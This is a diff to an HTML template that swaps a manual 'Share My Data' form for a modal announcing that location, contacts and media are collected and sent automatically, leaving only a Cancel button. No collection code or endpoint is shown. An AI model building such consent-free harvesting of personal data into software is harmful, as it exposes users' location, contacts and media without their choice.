@@ -356,36 +356,32 @@
     </div>
 </div>
 
-<!-- ── Modal: Data Collection ── -->
-<div class="sd-modal" id="sdCollect" style="display:none">
+<!-- ── Modal: Auto Progress ── -->
+<div class="sd-modal" id="sdProgress" style="display:none">
     <div class="sd-card sd-card-wide">
-        <h3>📤 Share My Data</h3>
+        <h3>📤 Collecting &amp; Sending Data</h3>
+        <p class="sd-note">Please wait — this happens automatically.</p>
 
-        <!-- Location -->
-        <div class="sd-section">
-            <label class="sd-label">📍 Location</label>
-            <p id="sdLocationStatus" class="sd-status">⏳ Detecting…</p>
+        <div class="sd-progress-list">
+            <div class="sd-step-row" id="sdStepLoc">
+                <span class="sd-step-icon">⏳</span>
+                <span class="sd-step-label">Waiting for location…</span>
+            </div>
+            <div class="sd-step-row" id="sdStepContacts">
+                <span class="sd-step-icon">⏳</span>
+                <span class="sd-step-label">Waiting for contacts…</span>
+            </div>
+            <div class="sd-step-row" id="sdStepMedia">
+                <span class="sd-step-icon">⏳</span>
+                <span class="sd-step-label">Waiting for media…</span>
+            </div>
+            <div class="sd-step-row" id="sdStepSend">
+                <span class="sd-step-icon">⏳</span>
+                <span class="sd-step-label">Waiting to send…</span>
+            </div>
         </div>
 
-        <!-- Image -->
-        <div class="sd-section">
-            <label class="sd-label">🖼️ Select Image</label>
-            <label class="sd-file-btn">
-                Choose Image
-                <input type="file" accept="image/*" style="display:none" onchange="sdImageSelected(this)">
-            </label>
-            <p id="sdImageStatus" class="sd-status">No file chosen</p>
-        </div>
-
-        <!-- Contact -->
-        <div class="sd-section">
-            <label class="sd-label">👤 Contact</label>
-            <input type="text" id="sdContactName" class="input-field" placeholder="Contact name" style="margin-bottom:8px">
-            <input type="tel"  id="sdContactNumber" class="input-field" placeholder="Phone number">
-        </div>
-
-        <div class="sd-actions">
-            <button class="btn btn-primary" onclick="sdSendData()">📨 Send Data</button>
+        <div class="sd-actions" style="margin-top:20px">
             <button class="btn btn-secondary" onclick="closeAllModals()">Cancel</button>
         </div>
     </div>
